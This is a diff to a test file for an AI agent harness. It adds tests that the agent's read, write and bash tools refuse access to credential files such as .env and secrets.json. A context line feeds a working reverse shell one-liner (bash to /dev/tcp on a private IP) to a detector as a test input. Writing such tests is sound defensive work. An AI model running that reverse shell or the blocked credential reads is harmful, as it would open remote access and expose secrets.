@@ -80,6 +80,16 @@ async function main(): Promise<void> {
   check("isUnclean detects reverse shell", isUnclean("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1") === true);
   check("isUnclean passes normal text", isUnclean("refactor the parser module") === false);
 
+  // 8. credential files are never agent-readable or agent-writable
+  const readSecrets = await runTool("read", { approved: true, path: ".harness/secrets.json" }, worktree);
+  check("read of secrets.json refused", readSecrets.ok === false && /credential/i.test(readSecrets.error ?? ""), readSecrets.error ?? "");
+  const writeEnv = await runTool("write", { approved: true, path: ".env", content: "KEY=x" }, worktree);
+  check("write of .env refused", writeEnv.ok === false && /credential/i.test(writeEnv.error ?? ""), writeEnv.error ?? "");
+  const catEnv = await runTool("bash", { approved: true, cmd: "cat .env" }, worktree);
+  check("bash cat .env refused", catEnv.ok === false && /credential/i.test(catEnv.error ?? ""), catEnv.error ?? "");
+  const envExample = await runTool("read", { approved: true, path: ".env.example" }, worktree);
+  check(".env.example stays readable (template, not secret)", envExample.ok === true || !/credential/i.test(envExample.error ?? ""), envExample.error ?? "(missing file is fine)");
+
   console.log(failures === 0 ? "[ehc] detonate gate tests: ALL PASS" : `[ehc] detonate gate tests: ${failures} FAILURE(S)`);
   process.exit(failures === 0 ? 0 : 1);
 }
